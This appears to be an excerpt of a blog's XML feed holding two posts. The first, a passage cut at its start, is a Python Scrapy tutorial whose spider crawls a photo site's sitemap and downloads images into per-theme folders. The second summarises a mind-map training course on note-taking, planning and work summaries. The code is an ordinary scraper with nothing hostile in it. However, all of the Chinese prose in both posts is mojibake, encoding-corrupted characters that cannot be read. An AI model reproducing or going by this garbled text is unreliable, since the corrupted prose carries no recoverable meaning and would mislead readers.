<h3 id="ç¼–å†™çˆ¬è™«"><a href="#ç¼–å†™çˆ¬è™«" class="headerlink" title="ç¼–å†™çˆ¬è™«"></a>ç¼–å†™çˆ¬è™«</h3><p>çˆ¬è™«å½“ç„¶æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼Œçˆ¬å–æ€è·¯ä¸å¼€å§‹æåŠçš„ç«™ç‚¹åˆ†ææ€è·¯ä¸€è‡´ï¼Œå…ˆçˆ¬å–ç«™ç‚¹åœ°å›¾ï¼Œç„¶ååœ¨è§£æå‡½æ•°<code>parse</code>ä¸­è·å–æ‰€æœ‰ä¸»é¢˜é¡µé¢çš„ç½‘å€å’Œæ ‡é¢˜ï¼Œå¹¶é€šè¿‡<code>VmgirlsItem</code>æäº¤åˆ°é¡¹ç›®ç®¡é“ï¼›ä¸æ­¤åŒæ—¶ï¼Œå°†çˆ¬å–åˆ°çš„ä¸»é¢˜é¡µé¢æäº¤ç»™å¼•æ“ï¼Œç”±å¼•æ“æŠŠéœ€æ±‚è½¬ç»™è°ƒåº¦å™¨å’Œä¸‹è½½å™¨ï¼›è¿™ä¸€æ­¥çˆ¬å–çš„ç»“æœç”±æ–°çš„è§£æå‡½æ•°<code>parse_page</code>å¤„ç†ã€‚</p>
<p>è§£æå‡½æ•°<code>parse_page</code>ä¼šå°†æ¯ä¸ªä¸»é¢˜é¡µé¢çš„å›¾ç‰‡é“¾æ¥å’Œæ ‡é¢˜æå–å‡ºæ¥ï¼Œç„¶åæäº¤ç»™é¡¹ç›®ç®¡é“ï¼Œç”±pipelineéƒ¨åˆ†å®Œæˆå›¾ç‰‡ä¸‹è½½æ“ä½œã€‚</p>
<pre><code class="python">import scrapy

from vmgirls.items import VmgirlsItem
from vmgirls.items import VmgirlsImagesItem

from scrapy.http import Request
from scrapy.utils.project import get_project_settings

import os

class VmgirlSpider(scrapy.Spider):
    name = &#39;vmgirl&#39;
    allowed_domains = [&#39;vmgirls.com&#39;]
    start_urls = [&#39;https://www.vmgirls.com/sitemap.shtml/&#39;]

    def __init__(self):
        settings = get_project_settings()
        self.user_data_dir = settings.get(&#39;USER_DATA_DIR&#39;)

    def parse(self, response):
        &#39;&#39;&#39;Parse sitemap&#39;&#39;&#39;
        urls = response.xpath(&#39;//*[@id=&quot;content&quot;][1]/ul/li/a/@href&#39;).extract()
        titles = response.xpath(&#39;//*[@id=&quot;content&quot;][1]/ul/li/a/text()&#39;).extract()

        item = VmgirlsItem()
        item[&#39;theme_urls&#39;] = urls
        item[&#39;theme_titles&#39;] = titles
        yield item

        for url, title in zip(urls, titles):
            save_path = os.path.join(self.user_data_dir, title)
            if not os.path.isdir(save_path):
                os.makedirs(save_path)

            yield Request(url, meta={&#39;title&#39;: title}, callback=self.parse_page)

    def parse_page(self, response):
        &#39;&#39;&#39;Parse each page of girls&#39;&#39;&#39;
        urls = response.xpath(&#39;//*[@class=&quot;post-content&quot;]//img/@data-src&#39;).extract()
        item = VmgirlsImagesItem()
        item[&#39;image_urls&#39;] = urls
        item[&#39;title&#39;] = response.meta[&#39;title&#39;]
        yield item
</code></pre>
<h3 id="ç¼–å†™Pipeline"><a href="#ç¼–å†™Pipeline" class="headerlink" title="ç¼–å†™Pipeline"></a>ç¼–å†™Pipeline</h3><p>çˆ¬è™«çˆ¬å–çš„ä¿¡æ¯æœ€ç»ˆé€šè¿‡é¡¹ç›®ç®¡é“è¿›è¡ŒæŒä¹…åŒ–å¤„ç†æˆ–è€…å®Œæˆç›¸åº”çš„èµ„æºä¸‹è½½ä»»åŠ¡ï¼Œä»ä¹‹å‰çš„é…ç½®æ–‡ä»¶æˆ‘ä»¬ä¹Ÿèƒ½çŸ¥é“ï¼Œæˆ‘ä»¬éœ€è¦ä¸¤ä¸ª<code>pipeline</code>ç±»ï¼Œä¸€ä¸ªå¤„ç†<code>VmgirlsItem</code>,å¦ä¸€ä¸ªå¤„ç†<code>VmgirlsImagesPipeline</code>ï¼Œä¸‹é¢é€ä¸€ä»‹ç»ã€‚</p>
<pre><code class="python">from scrapy.exporters import JsonLinesItemExporter
from scrapy.pipelines.images import ImagesPipeline
from scrapy.exceptions import DropItem
from scrapy.http import Request

from vmgirls.items import VmgirlsItem
from vmgirls.items import VmgirlsImagesItem

import os


class VmgirlsPipeline(object):
    &#39;&#39;&#39;Pipeline for every url of one theme, save theme info to json file&#39;&#39;&#39;
    def __init__(self, user_data_dir):
        &#39;&#39;&#39;Open file to save the exported Items&#39;&#39;&#39;
        self.user_data_dir = user_data_dir

        if not os.path.isdir(self.user_data_dir):
            os.makedirs(self.user_data_dir)

    @classmethod
    def from_crawler(cls, crawler):
        &#39;&#39;&#39;Get user dir from global settings.py&#39;&#39;&#39;
        settings = crawler.settings
        return cls(settings.get(&#39;USER_DATA_DIR&#39;))

    def process_item(self, item, spider):
        &#39;&#39;&#39;Save item info to loacl file&#39;&#39;&#39;
        if isinstance(item, VmgirlsItem):
            self.girls_info = open(
                os.path.join(self.user_data_dir, &#39;vmgirls.json&#39;), &#39;w+b&#39;)
            self.girls_exporter = JsonLinesItemExporter(
                self.girls_info, encoding=&#39;utf-8&#39;, indent=4)

            self.girls_exporter.start_exporting()

            for url, title in zip(item[&#39;theme_urls&#39;], item[&#39;theme_titles&#39;]):
                single_item = {&#39;theme_url&#39;:url, &#39;title&#39;:title}
                self.girls_exporter.export_item(single_item)

            self.girls_exporter.finish_exporting()
            self.girls_info.close()
        return item
</code></pre>
<p>ç¬¬ä¸€ä¸ª<code>pipeline</code>ç±»å°†ç«™ç‚¹åœ°å›¾çš„ä¿¡æ¯ä»¥<code>json</code>æ ¼å¼å­˜å‚¨åˆ°æ–‡ä»¶<code>vmgirls.json</code>ä¸­ã€‚è¿™é‡Œç”¨åˆ°äº†<code>JsonLinesItemExporter</code>,è¯¥ç±»å¯ä»¥å°†ä¸€ä¸ªä¸ª<code>dict</code>æ•°æ®ä»¥å•è¡Œå½¢å¼è½¬åŒ–æˆjsonæ ¼å¼ã€‚</p>
<pre><code class="python">class VmgirlsImagesPipeline(ImagesPipeline):
    &#39;&#39;&#39;Get images from one theme&#39;&#39;&#39;
    def get_media_requests(self, item, info):
        if isinstance(item, VmgirlsImagesItem):
            for image_url in item[&#39;image_urls&#39;]:
                yield Request(image_url, meta={&#39;item&#39;: item})

    def file_path(self, request, response=None, info=None):
        &#39;&#39;&#39;Set image dir to IMAGES_STORE/title/base_url&#39;&#39;&#39;
        url = request.url
        item = request.meta[&#39;item&#39;]
        path = os.path.join(item[&#39;title&#39;], url.split(&#39;/&#39;)[-1])
        return path

    def item_completed(self, results, item, info):
        if isinstance(item, VmgirlsImagesItem):
            image_paths = [x[&#39;path&#39;] for ok, x in results if ok]

            if not image_paths:
                raise DropItem(&quot;Item contains no images&quot;)
            return item
</code></pre>
<p>ç¬¬äºŒä¸ª<code>pipeline</code>ç±»ç»§æ‰¿äº<code>ImagesPipeline</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºå›¾ç‰‡ä¸‹è½½çš„ç®¡é“ç±»ï¼Œé…ç½®æ–‡ä»¶ä¸­çš„<code>IMAGES_STORE</code>æ­£æ˜¯ç”¨äºæŒ‡å®šè¯¥ç±»ä¸‹è½½å›¾ç‰‡åçš„å­˜æ”¾è·¯å¾„ã€‚</p>
<p>æˆ‘ä»¬è¿™é‡Œé‡å†™äº†ä¸‰ä¸ªå‡½æ•°ï¼š</p>
<ol>
<li><code>get_media_requests</code> è·å–æŸä¸»é¢˜é¡µé¢çš„æ‰€æœ‰å›¾ç‰‡é“¾æ¥ï¼Œä½¿ç”¨<code>Request</code>è¿›è¡Œä¸‹è½½</li>
<li><code>file_path</code> ä¸ºäº†å°†ä¸åŒä¸»é¢˜çš„å›¾ç‰‡å­˜å‚¨åœ¨ä¸åŒçš„æ–‡ä»¶å¤¹ï¼Œéœ€è¦ä¿®æ”¹å­˜å‚¨è·¯å¾„</li>
<li><code>item_completed</code> å½“å›¾ç‰‡ä¸‹è½½å®Œæˆåï¼Œè¿›å…¥è¯¥å‡½æ•°ï¼Œå¦‚æœæ²¡æœ‰ä¸‹è½½åˆ°å›¾ç‰‡åˆ™æç¤ºè¯¥<code>Item</code>ä¸åŒ…å«å›¾ç‰‡</li>
</ol>
<p>å¯ä»¥æ³¨æ„åˆ°ï¼Œä¸¤ä¸ªç®¡é“ç±»åœ¨å¤„ç†<code>item</code>å‰éƒ½æœ‰é€šè¿‡<code>isinstance</code>å‡½æ•°åˆ¤æ–­å½“å‰çš„<code>pipeline</code>å±äºå“ªä¸ªç±»çš„å®ä¾‹ï¼Œè¿™æ˜¯ä¸ºäº†ä¿è¯ä¸€ä¸ªç®¡é“ç±»åªå¤„ç†å¯¹åº”çš„ç®¡é“æ•°æ®ã€‚å› ä¸ºé»˜è®¤æƒ…å†µä¸‹ï¼Œçˆ¬è™«æäº¤å‡ºæ¥çš„æ‰€æœ‰<code>item</code>éƒ½ä¼šæ ¹æ®<code>pipeline</code>çš„ä¼˜å…ˆçº§ä¾æ¬¡ç»è¿‡ä¸¤ä¸ªç®¡é“ï¼Œä½†æˆ‘ä»¬å®é™…åªéœ€è¦æ¯ä¸ª<code>item</code>ç»è¿‡å¯¹åº”çš„ç®¡é“å³å¯ï¼Œæ‰€ä»¥ä½¿ç”¨<code>isinstance</code>è¿›è¡Œåˆ¤æ–­æ˜¯éå¸¸æœ‰å¿…è¦çš„ï¼Œæ—¢å¯ä»¥æé«˜å¤„ç†æ•ˆç‡ï¼Œåˆå¯ä»¥é¿å…è¿‡å¤šæ— æ•ˆlogå¯¹è°ƒè¯•è¿‡ç¨‹äº§ç”Ÿçš„å¹²æ‰°ã€‚</p>
<h2 id="çˆ¬å–ç»“æœ"><a href="#çˆ¬å–ç»“æœ" class="headerlink" title="çˆ¬å–ç»“æœ"></a>çˆ¬å–ç»“æœ</h2><p>ä¸ºäº†æ–¹ä¾¿çˆ¬å–ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„ä»£ç æ®µä½œä¸ºçˆ¬è™«çš„å…¥å£ã€‚</p>
<pre><code class="python">from scrapy import cmdline
cmdline.execute(&#39;scrapy crawl vmgirl&#39;.split())
</code></pre>
<p>æ‰§è¡Œåå¯ä»¥çœ‹åˆ°çˆ¬è™«åˆ°çš„å›¾ç‰‡æ•°æ®å¦‚ä¸‹ï¼š</p>
<p><img src="/assets/vmgirls/pictures.png" alt="capture result"></p>
<p>ä»£ç å·²æ‰˜ç®¡è‡³å¼€æºé¡¹ç›®<a href="https://github.com/Litreily/capturer" target="_blank" rel="noopener">litreily/capturer</a>, æ¬¢è¿Starå’Œäº¤æµã€‚</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spider </tag>
            
            <tag> girls </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[é«˜æ•ˆæ€ç»´å¯¼å›¾åº”ç”¨è®­ç»ƒ]]></title>
      <url>https://www.litreily.top/2019/06/11/mind-map/</url>
      <content type="html"><![CDATA[<p>ä¸Šå‘¨åœ¨å…¬å¸è¿›è¡Œäº†ä¸€å¤©çš„æ€ç»´å¯¼å›¾åŸ¹è®­ï¼Œæ„Ÿè§‰æ”¶è·é¢‡ä¸°ï¼Œæœ‰å¿…è¦æ€»ç»“ä¸€ä¸‹ã€‚</p>
<h2 id="æ€ç»´å¯¼å›¾æ¦‚è¿°"><a href="#æ€ç»´å¯¼å›¾æ¦‚è¿°" class="headerlink" title="æ€ç»´å¯¼å›¾æ¦‚è¿°"></a>æ€ç»´å¯¼å›¾æ¦‚è¿°</h2><h3 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p>æ€ç»´å¯¼å›¾ä¸»è¦ç”¨äºè§£å†³ä»¥ä¸‹ä¸‰ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li>è®°ä¸ä½</li>
<li>ç†ä¸æ¸…</li>
<li>æƒ³ä¸å‡º</li>
</ol>
<p>è¿™ä¸‰ä¸ªä¹Ÿæ˜¯å·¥ä½œæ•ˆèƒ½ä½ä¸‹çš„ä¸»è¦åŸå› ã€‚é‚£ç©¶ç«Ÿä»€ä¹ˆæ˜¯æ€ç»´å¯¼å›¾å‘¢ï¼Ÿ</p>
<blockquote>
<p><strong>æ€ç»´å¯¼å›¾</strong>æ˜¯è¡¨è¾¾<strong>æ”¾å°„æ€§æ€ç»´</strong>çš„å›¾å½¢æ€ç»´å·¥å…·ã€‚ç”¨<strong>å›¾æ–‡</strong>æŠ€å·§ï¼ŒæŠŠå„çº§ä¸»é¢˜å…³ç³»ç”¨å±‚çº§å›¾è¡¨ç°ï¼Œå°†å…³é”®è¯ä¸å›¾åƒã€é¢œè‰²ç­‰å»ºç«‹æ€ç»´é“¾æ¥ã€‚ç”¨<strong>å…¨è„‘æœºèƒ½</strong>ï¼Œä½¿åœ¨ç§‘å­¦ä¸è‰ºæœ¯ã€é€»è¾‘ä¸æƒ³è±¡é—´å¹³è¡¡ï¼Œå¼€å¯å¤§è„‘æ½œèƒ½ã€‚</p>
</blockquote>
<a id="more"></a>
<p><strong>æ€ç»´å¯¼å›¾</strong>åŒ…å«ä»¥ä¸‹6å¤§è¦ç´ ï¼Œå…¶ä¸­ï¼Œä¸­å¿ƒä¸»é¢˜ç›´æ¥å†³å®šæ€ç»´å¯¼å›¾çš„å†…å®¹ã€‚æ‰€è°“<strong>å·¦é€»å³è‰º</strong>ï¼Œå·¦è„‘è´Ÿè´£é€»è¾‘æ€ç»´ï¼Œå³è„‘è´Ÿè´£è‰ºæœ¯æƒ³è±¡ã€‚ä¸‹é¢çš„1ã€2ã€6ç”±å·¦è„‘è´Ÿè´£ï¼Œ3ã€4ã€5ç”±å³è„‘è´Ÿè´£ï¼Œ<strong>å…³ç³»</strong>çš„æœ¬è´¨æ˜¯<strong>å†…åœ¨é€»è¾‘</strong>ã€‚</p>
<p><img src="/assets/mindmap/element.png" alt="six element"></p>
<p>é‚£æˆ‘ä»¬å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå›¾æ˜¯å¦æ˜¯æ€ç»´å¯¼å›¾å‘¢ï¼Ÿå¯ä»¥æ ¹æ®ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p>
<ol>
<li>å›¾å½¢æ˜¯å¦å‘æ•£</li>
<li>æ˜¯å¦å…·å¤‡å¿…ä¸å¯å°‘çš„ä¸‰ä¸ªè¦ç´ ï¼ˆä¸Šå›¾ä¸­çš„1ã€2ã€3ï¼‰</li>
</ol>
<h3 id="ç”±æ¥"><a href="#ç”±æ¥" class="headerlink" title="ç”±æ¥"></a>ç”±æ¥</h3><p>æ¥ä¸‹æ¥ç®€å•äº†è§£ä¸‹æ€ç»´å¯¼å›¾çš„ç”±æ¥ã€‚æ€ç»´å¯¼å›¾ç”±è‹±å›½æ‰˜å°¼-åšèµ<strong>Tony Buzan</strong>å…ˆç”Ÿå‘æ˜ï¼Œä»–æ˜¯å—åäººç¬”è®°ï¼ˆåŒ…æ‹¬è¾¾å°”æ–‡ã€è¾¾èŠ¬å¥‡å’Œçˆ±å› æ–¯å¦çš„ç¬”è®°ï¼Œä»–ä»¬çš„ç¬”è®°éƒ½æ˜¯å›¾æ–‡å½¢å¼è€Œä¸”å‘ˆå‘æ•£çŠ¶ï¼‰å’Œç¥ç»å…ƒç»†èƒå¤–å½¢çš„å¯å‘ã€‚è¿™äº›å›¾å½¢çš„ç‰¹ç‚¹æ˜¯ï¼š</p>
<blockquote>
<p>ä¸€ä¸­å¿ƒå¤šææ¡ï¼Œææ¡ç»•ä¸­å¿ƒç”»ï¼Œä¸»å¹²ç²—åˆ†æ”¯ç»†ï¼Œæ¡æ¡è¿ä¸åˆ†å®¶</p>
</blockquote>
<p><img src="/assets/mindmap/neure.jpg" alt="neure cell"></p>
<h3 id="å®è·µ"><a href="#å®è·µ" class="headerlink" title="å®è·µ"></a>å®è·µ</h3><p>æ€ç»´å¯¼å›¾å¯åº”ç”¨äºç”Ÿæ´»ã€å·¥ä½œå’Œå­¦ä¹ çš„æ–¹æ–¹é¢é¢ï¼Œä¸‹å›¾æ˜¯æ ¹æ®åŸ¹è®­èµ„æ–™ç»˜åˆ¶çš„ä¸€ä¸ªdemoã€‚</p>
<p><img src="/assets/mindmap/application.png" alt="application"></p>
<p>æ€»çš„æ¥è¯´ï¼ŒåŒ…å«<strong>è®°ç†æåˆ›</strong>å››ä¸ªä½œç”¨ï¼š</p>
<ul>
<li><strong>è®°</strong> - å¸®åŠ©è®°å¿†</li>
<li><strong>ç†</strong> - å¸®åŠ©ç†æ¸…æ€è·¯</li>
<li><strong>æ</strong> - å¸®åŠ©åˆ†æé—®é¢˜</li>
<li><strong>åˆ›</strong> - å¸®åŠ©åˆ›æ–°ï¼Œå¼€æ‹“æ€ç»´</li>
</ul>
<p>é«˜æ•ˆè®°å¿†çš„æ–¹æ³•æ˜¯<strong>è”æƒ³</strong>å’Œ<strong>è”ç³»</strong>ï¼ŒåŸ¹è®­è¯¾ä¸Šè€å¸ˆç»™æˆ‘ä»¬åšäº†ä¸ªæ¸¸æˆï¼Œæ¯ä¸ªç»„ç»™å‡ºéšæ„ä¸¤ä¸ªä¸¤ä½æ•°ï¼Œ7ä¸ªç»„å…±28ä¸ªæ•°å­—ã€‚è€å¸ˆé€šè¿‡å¯¹æ¯ä¸ªä¸¤ä½æ•°è¿›è¡Œç¼–ç ï¼Œé€šè¿‡è°éŸ³è¯å»æ›¿æ¢ï¼Œæ¯”å¦‚36å¯¹åº”ä¸‰é¹¿å¥¶ç²‰ï¼Œ87å¯¹åº”ç™½æ——ï¼Œ63å¯¹åº”ç¡«é…¸ç­‰ç­‰ï¼Œç„¶åå°†è¿™äº›è¯ç¼–æˆä¸€ä¸ªæ•…äº‹ï¼Œè¶Šç¦»è°±è¶Šå¥½ï¼Œç»“æœçœŸçš„è®°ä½äº†ï¼Œè€Œä¸”æ²¡æœ‰ç‰¹åˆ«å¤ä¹ ï¼Œå€’èƒŒå¦‚æµã€‚è¿™ä¹Ÿç¡®å®è¯´æ˜å¤§è„‘å¯¹å›¾åƒï¼Œæˆ–è€…ç”»é¢çš„è®°å¿†æ›´æ·±åˆ»ã€‚è€Œæ€ç»´å¯¼å›¾ä¹‹æ‰€ä»¥åŠŸèƒ½å¼ºå¤§ï¼Œå°±æ˜¯å› ä¸ºå®ƒèƒ½è¾¾åˆ°ä¸€ç§<strong>å›¾å¯¼æ€ç»´</strong>çš„æ•ˆæœï¼Œé€šè¿‡å¤§è„‘å®¹æ˜“è®°å¿†çš„å›¾å½¢å¼•å¯¼å’Œå¼€æ‹“æ€ç»´ã€‚</p>
<h2 id="æ€ç»´å¯¼å›¾çš„è¯»ä¸ç»˜"><a href="#æ€ç»´å¯¼å›¾çš„è¯»ä¸ç»˜" class="headerlink" title="æ€ç»´å¯¼å›¾çš„è¯»ä¸ç»˜"></a>æ€ç»´å¯¼å›¾çš„è¯»ä¸ç»˜</h2><p>äº†è§£äº†ä»€ä¹ˆæ˜¯æ€ç»´å¯¼å›¾ï¼Œä»¥åŠå¯¼å›¾çš„åº”ç”¨ï¼Œä¸‹é¢ä¾¿æ¥è¯´æ˜å¯¼å›¾çš„é˜…è¯»ä¸ç»˜åˆ¶ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œå…ˆæ˜ç¡®ä¸€ç‚¹ï¼Œæ€ç»´å¯¼å›¾æ ¹æ®å›¾æ–‡æ ·å¼åˆ†ä¸º<strong>å…¨å›¾</strong>ã€<strong>å…¨æ–‡</strong>å’Œ<strong>å›¾æ–‡</strong>ä¸‰ç±»ï¼Œå…¶ä¸­å…¨å›¾çš„å¯è¯»æ€§æœ€å·®ï¼Œå›¾æ–‡çš„å¯è¯»æ€§æœ€å¼ºã€‚</p>
<h3 id="è¯»æ‡‚å¯¼å›¾"><a href="#è¯»æ‡‚å¯¼å›¾" class="headerlink" title="è¯»æ‡‚å¯¼å›¾"></a>è¯»æ‡‚å¯¼å›¾</h3><p>è¯»æ‡‚æ€ç»´å¯¼å›¾ï¼Œåˆ†ä»¥ä¸‹4ä¸ªæ­¥éª¤ï¼š</p>
<p><img src="/assets/mindmap/read.png" alt="read"></p>
<p>ä»<strong>1ç‚¹é’Ÿ</strong>æ–¹å‘å¼€å§‹è¯»ä¸»å¹²ï¼ŒæŒ‰<strong>é¡ºæ—¶é’ˆ</strong>æ–¹å‘é˜…è¯»ã€‚</p>
<h3 id="ç»˜åˆ¶å¯¼å›¾"><a href="#ç»˜åˆ¶å¯¼å›¾" class="headerlink" title="ç»˜åˆ¶å¯¼å›¾"></a>ç»˜åˆ¶å¯¼å›¾</h3><p>ç»˜åˆ¶æ€ç»´å¯¼å›¾åŒæ ·åˆ†ä¸ºå››æ­¥ï¼Œå…ˆç¡®å®šä¸­å¿ƒä¸»é¢˜ï¼Œç„¶åé€ä¸€ç»˜åˆ¶ä¸»å¹²éƒ¨åˆ†ï¼Œè¿›è€Œç»˜åˆ¶æ”¯å¹²ï¼Œæœ€ååŠ ä¸Šæ’å›¾å¹¶ç€è‰²ä¿®é¥°ã€‚</p>
<p><img src="/assets/mindmap/write.png" alt="write"></p>
<p>æ­¤å¤–ï¼Œç»˜åˆ¶å¯¼å›¾éœ€è¦éµå¾ªä»¥ä¸‹10ä¸ªè§„åˆ™å’ŒæŠ€å·§ï¼š</p>
<ol>
<li>å¤§è„‘åå¥½å›¾å½¢</li>
<li>å¤§è„‘åå¥½å½©è‰²</li>
<li>åŒæ”¯åŒè‰²ï¼ˆåŒä¸€åˆ†æ”¯åŒä¸€é¢œè‰²ï¼‰</li>
<li>å¤§è„‘å–œæ¬¢å¼¯çš„ï¼Œå³å¼•å¯¼çº¿è¦æ˜¯æ›²çº¿</li>
<li>å¼•å¯¼çº¿ç”±ç²—åˆ°ç»†</li>
<li>ç”±ç‚¹å‘æ•£</li>
<li>å­—åœ¨çº¿ä¸Š</li>
<li>å­—çº¿ç­‰é•¿ï¼ˆå­—åœ¨çº¿ä¸­é—´ï¼‰</li>
<li>ç”¨è¯è€Œä¸åŒå¥å­æˆ–çŸ­è¯­</li>
<li>çº¸è¦æ¨ªæ”¾ï¼ˆA4çº¸ï¼‰</li>
</ol>
<p>è¿™äº›è§„åˆ™å¯ä»¥æŒ‡å¯¼æˆ‘ä»¬ç»˜åˆ¶æ€ç»´å¯¼å›¾ï¼Œä½†å…·ä½“æƒ…å†µå…·ä½“åˆ†æï¼Œæ¯”å¦‚å¾ˆå¤šæ€ç»´å¯¼å›¾è½¯ä»¶ç»˜åˆ¶çš„å¼•å¯¼çº¿ä¸ä¸€å®šæ˜¯å¼¯çš„ã€‚</p>
<h2 id="æ€ç»´å¯¼å›¾çš„èŒåœºåº”ç”¨"><a href="#æ€ç»´å¯¼å›¾çš„èŒåœºåº”ç”¨" class="headerlink" title="æ€ç»´å¯¼å›¾çš„èŒåœºåº”ç”¨"></a>æ€ç»´å¯¼å›¾çš„èŒåœºåº”ç”¨</h2><h3 id="è®°ç¬”è®°"><a href="#è®°ç¬”è®°" class="headerlink" title="è®°ç¬”è®°"></a>è®°ç¬”è®°</h3><p>åœ¨å·¥ä½œä¼šè®®ä¸­ï¼Œéœ€è¦åšç¬”è®°ï¼Œæ­¤æ—¶å¦‚æœä½¿ç”¨ä¼ ç»Ÿç¬”è®°ï¼Œä¼šæœ‰ä»¥ä¸‹å¼Šç—…ï¼š</p>
<p><img src="/assets/mindmap/note_bad.png" alt="bad note"></p>
<p>ç›¸æ¯”ä¹‹ä¸‹ï¼Œä½¿ç”¨æ€ç»´å¯¼å›¾å…·æœ‰æ›´å¤šçš„ä¼˜åŠ¿ï¼š</p>
<p><img src="/assets/mindmap/note_mind.png" alt="mind note"></p>
<p>ä½¿ç”¨æ€ç»´å¯¼å›¾åšç¬”è®°ï¼Œè®²ç©¶<strong>æŠ“ã€ç”»ã€ä¿®</strong>ï¼Œå’Œå¥³ç”ŸåŒ–å¦†æœ‰ç‚¹ç±»ä¼¼ã€‚<strong>æŠ“</strong>å…³é”®è¯ï¼Œ<strong>ç”»</strong>æ€ç»´å¯¼å›¾ï¼Œ<strong>ä¿®</strong>å¯¼å›¾ç»†èŠ‚ã€‚å…¶ä¸­<strong>æŠ“</strong>æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼Œ<strong>å…³é”®è¯</strong>æ˜¯ç²¾ç®€çš„æ ¸å¿ƒä¿¡æ¯ï¼Œå¯å”¤é†’è®°å¿†ï¼Œèƒ½æ‰©å±•æ€ç»´ã€‚</p>
<p>å¯¹äº<strong>å…³é”®è¯</strong>ï¼Œæˆ‘ä»¬å¯ä»¥ä»æ–‡ç« æˆ–ä¼šè®®çš„å››ä¸ªæ–¹é¢ç€æ‰‹ï¼Œåˆ†åˆ«æ˜¯<strong>æ ‡é¢˜</strong>ã€<strong>ä¸­å¿ƒå¥</strong>ã€<strong>é«˜é¢‘è¯</strong>å’Œ<strong>è½¬æŠ˜å</strong>ï¼Œè€Œä¸”å…³é”®è¯å¤šåŠä¸ºåè¯ã€åŠ¨è¯å’Œå½¢å®¹è¯ã€‚æŠ“å–è¿‡ç¨‹éœ€æŒæ¡<strong>è¾¨è™šå®</strong>ã€<strong>æ˜å¤§å°</strong>ã€<strong>åˆ†ä¸»æ¬¡</strong>ï¼Œä»¥ä¾¿ç†æ¸…æ€è·¯ï¼Œæ˜ç¡®å…³é”®è¯ã€‚</p>
<p>å¯¹äºä¼šè®®ç¬”è®°ï¼Œå…¶ç¬¬ä¸€ä¸»å¹²åº”è¯¥æ˜¯åŸºæœ¬æƒ…å†µï¼ŒåŒ…æ‹¬æ—¶é—´ã€åœ°ç‚¹å’Œäººç‰©ï¼›å¦‚æœæ˜¯å¤šä¸ªäººè®²è¯ï¼Œåˆ™åº”è¯¥ä¸€ä¸ªäººå¯¹åº”ä¸€ä¸ªä¸»å¹²ã€‚åŒæ—¶è¦æ¸…æ¥šçš„æ˜¯ï¼Œ<strong>è®°ç¬”è®°</strong>å’Œ<strong>åšç¬”è®°</strong>æ˜¯ä¸ä¸€æ ·çš„ï¼ŒåŒºåˆ«å¦‚ä¸‹ï¼š</p>
<ol>
<li>è®°æ˜¯è¦å¤è¿°ã€è¿˜åŸ</li>
<li>åšæ˜¯è¦åŠ å·¥ã€æç‚¼åˆ†æ</li>
<li>ä»å†…å®¹è§’åº¦è€Œè¨€ï¼Œè®°ç¬”è®°æœ‰æ ‡å‡†ç­”æ¡ˆ</li>
<li>å·¥ä½œä¸­é¦–é€‰<strong>è®°ç¬”è®°</strong></li>
</ol>
<h3 id="åšè®¡åˆ’"><a href="#åšè®¡åˆ’" class="headerlink" title="åšè®¡åˆ’"></a>åšè®¡åˆ’</h3><p>åˆ¶å®šè®¡åˆ’ï¼Œè®¾å®šç›®æ ‡å¯ä»¥å‚è€ƒç®¡ç†å­¦çš„<a href="https://baike.baidu.com/item/smart/2230883" target="_blank" rel="noopener">SMART</a>åŸåˆ™ï¼Œå…·ä½“çš„å¯ä»¥å‚è€ƒç™¾åº¦ç™¾ç§‘SMARTè¯æ¡ï¼Œè¿™é‡Œä¸äºˆè¯¦è¿°ã€‚</p>
<ul>
<li><strong>S</strong>pecific å…·ä½“çš„</li>
<li><strong>M</strong>easureable å¯åº¦é‡çš„</li>
<li><strong>A</strong>chievable å¯å®ç°çš„</li>
<li><strong>R</strong>elevant ç›¸å…³æ€§</li>
<li><strong>T</strong>ime-Based æœ‰æ—¶é™çš„</li>
</ul>
<p>åˆ¶å®šè®¡åˆ’åˆ†ä¸‰éƒ¨åˆ†ï¼Œ<strong>æ–¹æ¡ˆé¢„æ¡ˆ</strong>ã€<strong>æ ¸å¿ƒè¦ç´ </strong>å’Œ<strong>ç»†èŠ‚å·¥ä½œ</strong></p>
<p><img src="/assets/mindmap/plan.png" alt="plan"></p>
<p>å…¶ä¸­<strong>5W2H</strong>å¯ä»¥å¸®åŠ©æˆ‘ä»¬ç†æ¸…æ€è·¯ï¼Œåšå¥½è®¡åˆ’ï¼Œé‚£ä¹ˆåˆ¶å®šä¸€ä¸ªå®Œæ•´è®¡åˆ’ï¼Œå°±å¯ä»¥å¤§è‡´æŒ‰ç…§ä¸‹é¢çš„æ€ç»´å¯¼å›¾è¿›è¡Œã€‚</p>
<p><img src="/assets/mindmap/plan_full.png" alt="full plan"></p>
<h3 id="åšæ€»ç»“"><a href="#åšæ€»ç»“" class="headerlink" title="åšæ€»ç»“"></a>åšæ€»ç»“</h3><p>åšå·¥ä½œæ€»ç»“åŒ…å«ä»¥ä¸‹6ä¸ªç›®çš„ï¼š</p>
<p><img src="/assets/mindmap/summary.png" alt="summary"></p>
<ul>
<li>çœ‹è¿›å±• å½“å‰å·²å®ŒæˆåŠæœªå®Œæˆçš„æƒ…å†µ</li>
<li>å¯»ç»éªŒ å¯¹é«˜æ•ˆå·¥ä½œã€è§£å†³é—®é¢˜ç­‰æœ‰å¸®åŠ©çš„ç»éªŒï¼Œè¡¨åŠŸ</li>
<li>æ‰¾é—®é¢˜ å·¥ä½œä¸­é‡åˆ°çš„é—®é¢˜</li>
<li>æåŸå›  åˆ†ææ‰€æ‰¾é—®é¢˜äº§ç”Ÿçš„åŸå› </li>
<li>å®šæ–¹å‘ æ ¹æ®è¿›å±•å’Œé—®é¢˜åˆ¶å®šåç»­å·¥ä½œæ–¹å‘</li>
<li>æå»ºè®® ä¸ºäº†å®Œæˆåˆ¶å®šçš„ç›®æ ‡ï¼Œéœ€è¦å‘é¢†å¯¼ç´¢è¦çš„èµ„æº</li>
</ul>
